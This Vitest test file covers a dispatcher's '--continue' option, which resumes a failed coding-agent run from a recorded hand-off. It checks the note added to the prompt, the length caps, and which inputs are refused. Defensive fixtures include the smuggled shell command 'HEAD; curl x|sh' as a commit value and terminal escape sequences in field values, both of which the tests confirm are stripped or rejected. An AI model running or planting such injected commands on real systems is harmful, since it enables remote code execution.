import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { EventEmitter } from 'node:events';
import { mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import * as path from 'node:path';
import { fileURLToPath } from 'node:url';

// Q9: --continue <nodeId> resumes a failed run's hand-off. Spawn, provider readers and the node
// append are mocked (the orchestra-dispatch-candidates pattern); the tree is a REAL temp dir.
const mocks = vi.hoisted(() => ({ codex: vi.fn(), glm: vi.fn(), appendFile: vi.fn(), spawn: vi.fn() }));
vi.mock('../dispatcher/usage.mjs', async importOriginal => ({
  ...await importOriginal<Record<string, unknown>>(),
  readCodexUsage: mocks.codex, readGlmUsage: mocks.glm,
}));
vi.mock('node:child_process', () => ({ spawn: mocks.spawn }));
vi.mock('node:fs', async importOriginal => ({
  ...await importOriginal<Record<string, unknown>>(),
  appendFileSync: vi.fn(), mkdirSync: vi.fn(),
}));
vi.mock('node:fs/promises', async importOriginal => ({
  ...await importOriginal<Record<string, unknown>>(),
  mkdir: vi.fn(), appendFile: mocks.appendFile,
}));
// @ts-expect-error - dispatcher tooling is plain ESM.
import { main } from '../dispatcher/dispatch.mjs';

const PROMPT = 'shared spec\nline two';
const SUFFIX = 'per-run suffix';
const SHA = 'a'.repeat(40);
const CONTROL = /[\u0000-\u001f\u007f-\u009f]/;

describe('dispatch --continue (Q9)', () => {
  let treeDir: string;
  let liveDir: string;
  let worktree: string;
  let exitCode: typeof process.exitCode;
  beforeEach(() => {
    vi.clearAllMocks();
    exitCode = process.exitCode;
    treeDir = mkdtempSync(path.join(tmpdir(), 'orchestra-continue-tree-'));
    liveDir = mkdtempSync(path.join(tmpdir(), 'orchestra-continue-live-'));
    worktree = realpathSync(mkdtempSync(path.join(tmpdir(), 'orchestra-continue-wt-')));
    vi.stubEnv('ORCHESTRA_TREE_DIR', treeDir);
    vi.stubEnv('ORCHESTRA_LIVE_DIR', liveDir);
    // Package-only: the shipped policy and ranking, never a user's gitignored dispatcher/policy.json.
    vi.stubEnv('ORCHESTRA_POLICY', fileURLToPath(new URL('../dispatcher/policy.example.json', import.meta.url)));
    vi.stubEnv('ORCHESTRA_RANKING_FILE', fileURLToPath(new URL('../dispatcher/model-ranking.example.json', import.meta.url)));
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true);
    vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
    mocks.codex.mockResolvedValue({ status: 'unknown', reason: 'mocked', windows: [] });
    mocks.glm.mockResolvedValue({ status: 'unknown', reason: 'mocked', windows: [] });
    mocks.spawn.mockImplementation(() => {
      const child = Object.assign(new EventEmitter(), { stdout: new EventEmitter(), stderr: new EventEmitter() });
      queueMicrotask(() => child.emit('close', 0, null));
      return child;
    });
  });
  afterEach(() => {
    process.exitCode = exitCode;
    vi.unstubAllEnvs();
    vi.restoreAllMocks();
    for (const dir of [treeDir, liveDir, worktree]) rmSync(dir, { recursive: true, force: true });
  });

  const handoffOf = (extra: Record<string, unknown> = {}) => ({
    v: 1, reason: 'limit', exitCode: 1, signal: null, resetsAt: null, branch: 'feature/x', worktree,
    base: 'b'.repeat(40), commit: SHA, commitSkipped: null, changed: ['M\tsrc/a.ts', '?\tnew.txt'],
    finalTextTail: 'stopped here', at: '2026-10-17T00:00:00.000Z', ...extra,
  });
  const seed = (...nodes: Record<string, unknown>[]) =>
    writeFileSync(path.join(treeDir, 'hist.jsonl'), `${nodes.map(n => JSON.stringify(n)).join('\n')}\n`);
  const prior = (extra: Record<string, unknown> = {}) => ({
    schemaVersion: 1, nodeId: 'prior-1', task: 'mock-continue', role: 'reason', cli: 'codex', model: 'gpt-6-astra',
    handoff: handoffOf(), recordedAt: '2026-10-17T00:00:00.000Z', ...extra,
  });
  const dispatch = (...extra: string[]) =>
    main(['--role', 'reason', '--task', 'mock-continue', '--prompt', PROMPT, ...extra]);
  const argvOf = (call = 0) => mocks.spawn.mock.calls[call][1] as string[];
  const sentPrompt = (call = 0) => argvOf(call).at(-1) as string;
  const rootOf = (call = 0) => argvOf(call)[argvOf(call).indexOf('-C') + 1];
  const node = (call = 0) => JSON.parse(mocks.appendFile.mock.calls[call][1]);

  it('appends the note after the suffix; the prompt bytes and prefixSha are a fresh run\'s', async () => {
    seed(prior());
    await dispatch('--suffix', SUFFIX);
    const fresh = node(0);
    const freshPrompt = sentPrompt(0);
    await dispatch('--suffix', SUFFIX, '--continue', 'prior-1');
    const sent = sentPrompt(1);
    expect(sent.startsWith(`${PROMPT}\n\n${SUFFIX}\n\n`)).toBe(true);
    expect(sent.startsWith(freshPrompt)).toBe(true);
    const note = sent.slice(`${PROMPT}\n\n${SUFFIX}\n\n`.length);
    expect(note.startsWith('Continuation: a previous run (codex/gpt-6-astra, node prior-1) stopped (limit)')).toBe(true);
    expect(note).toContain(`commit ${SHA} on branch feature/x`);
    expect(note).toContain('M src/a.ts');
    expect(note).toContain('? new.txt');
    expect(note).toContain(`git show --stat ${SHA}`);
    expect(note.endsWith('do not redo finished work.')).toBe(true);
    expect(node(1).prefixSha).toBe(fresh.prefixSha);
    expect(node(1).prompt).toBe(PROMPT);
    expect(node(1).continuedFrom).toBe('prior-1');
    expect(node(1).parentId).toBe('prior-1');
    expect(fresh).not.toHaveProperty('continuedFrom');
    expect(rootOf(1)).toBe(worktree);
  });

  it('without a suffix the note follows the prompt directly', async () => {
    seed(prior());
    await dispatch('--continue', 'prior-1');
    expect(sentPrompt().startsWith(`${PROMPT}\n\nContinuation: `)).toBe(true);
  });

  it('accepts --root equal to the hand-off worktree', async () => {
    seed(prior());
    await dispatch('--continue', 'prior-1', '--root', worktree);
    expect(rootOf()).toBe(worktree);
    expect(node().continuedFrom).toBe('prior-1');
  });

  it('names the skipped commit when there is none', async () => {
    seed(prior({ handoff: handoffOf({ commit: null, commitSkipped: 'default-branch', branch: 'main' }) }));
    await dispatch('--continue', 'prior-1');
    expect(sentPrompt()).toContain('no commit — default-branch');
    expect(sentPrompt()).not.toContain('git show --stat');
  });

  it('caps the changed list at 20 lines', async () => {
    const changed = Array.from({ length: 30 }, (_, i) => `M\tfile-${i}.ts`);
    seed(prior({ handoff: handoffOf({ changed }) }));
    await dispatch('--continue', 'prior-1');
    expect(sentPrompt()).toContain('M file-19.ts');
    expect(sentPrompt()).not.toContain('file-20.ts');
  });

  it.each([
    ['an unknown id', () => [prior()], ['--continue', 'nope'], /--continue: no node "nope"/],
    ['a missing id', () => [prior()], ['--continue'], /--continue: no node null/],
    ['a node without a handoff', () => [prior({ handoff: undefined })], ['--continue', 'prior-1'], /--continue: node prior-1 has no handoff/],
    ['a handoff without a worktree', () => [prior({ handoff: handoffOf({ worktree: null }) })], ['--continue', 'prior-1'], /names no worktree/],
    ['a --root other than the hand-off worktree', () => [prior()], ['--continue', 'prior-1', '--root', tmpdir()], /is not the hand-off worktree/],
  ])('refuses %s and spawns nothing', async (_label, nodes, extra, message) => {
    // Lazy: the table is built before beforeEach makes the worktree.
    seed(...nodes());
    await expect(dispatch(...extra)).rejects.toThrow(message);
    expect(mocks.spawn).not.toHaveBeenCalled();
    expect(mocks.appendFile).not.toHaveBeenCalled();
  });

  it('never lets a control character from the hand-off reach argv', async () => {
    seed(prior({
      cli: 'codex\u001b[31m', model: 'm\u0007odel',
      handoff: handoffOf({
        reason: 'li\u0000mit', branch: 'feat\u001b]8;;http://x\u0007ure', commit: `${SHA}\n`,
        changed: ['M\tsrc/\u001b[2Jevil\nname.ts', '?\tok\u009b.txt'],
        finalTextTail: 'TAILMARK\u001b[31m\u0007',
      }),
    }));
    await dispatch('--suffix', SUFFIX, '--continue', 'prior-1');
    const note = sentPrompt().slice(`${PROMPT}\n\n${SUFFIX}\n\n`.length);
    expect(note).not.toMatch(CONTROL);
    expect(note).toContain('M src/evilname.ts');
    // Pins that finalTextTail is LEFT OUT of the note, not that it is cleaned: putting it in the
    // note later must come with its own cleaning test.
    for (const arg of argvOf()) expect(arg).not.toContain('TAILMARK');
  });

  // One distinct letter per field, so each cap is pinned on its own value: exactly `cap` copies
  // appear, never `cap + 1`.
  const capped = (note: string, ch: string, cap: number) => {
    expect(note).toContain(ch.repeat(cap));
    expect(note).not.toContain(ch.repeat(cap + 1));
  };
  const LONG = 5000;

  it('caps every interpolated value: cli/model/nodeId 80, reason 40, branch 200, changed line 300', async () => {
    const id = 'N'.repeat(LONG);
    seed(prior({
      nodeId: id, cli: 'C'.repeat(LONG), model: 'D'.repeat(LONG),
      handoff: handoffOf({ reason: 'R'.repeat(LONG), branch: 'B'.repeat(LONG), changed: [`M\t${'L'.repeat(LONG)}`] }),
    }));
    await dispatch('--continue', id);
    const note = sentPrompt().slice(`${PROMPT}\n\n`.length);
    capped(note, 'C', 80);
    capped(note, 'D', 80);
    capped(note, 'N', 80);
    capped(note, 'R', 40);
    capped(note, 'B', 200);
    capped(note, 'L', 298); // 300 for the whole line, "M " included
  });

  it('caps commitSkipped at 200', async () => {
    seed(prior({ handoff: handoffOf({ commit: null, commitSkipped: 'S'.repeat(LONG) }) }));
    await dispatch('--continue', 'prior-1');
    capped(sentPrompt(), 'S', 200);
  });

  it.each([
    ['a shell command', 'HEAD; curl x|sh'],
    ['a 65-digit hex string', 'a'.repeat(65)],
    ['a 6-digit hex prefix', 'abcdef'],
    ['upper-case hex', 'A'.repeat(40)],
  ])('treats a commit that is %s as no commit and points at git status', async (_label, commit) => {
    seed(prior({ handoff: handoffOf({ commit, commitSkipped: null }) }));
    await dispatch('--continue', 'prior-1');
    const sent = sentPrompt();
    expect(sent).not.toContain(commit);
    expect(sent).not.toContain('git show');
    expect(sent).toContain('read `git status`');
  });

  it('accepts a 7-digit short sha', async () => {
    seed(prior({ handoff: handoffOf({ commit: 'abc1234' }) }));
    await dispatch('--continue', 'prior-1');
    expect(sentPrompt()).toContain('git show --stat abc1234');
  });
});
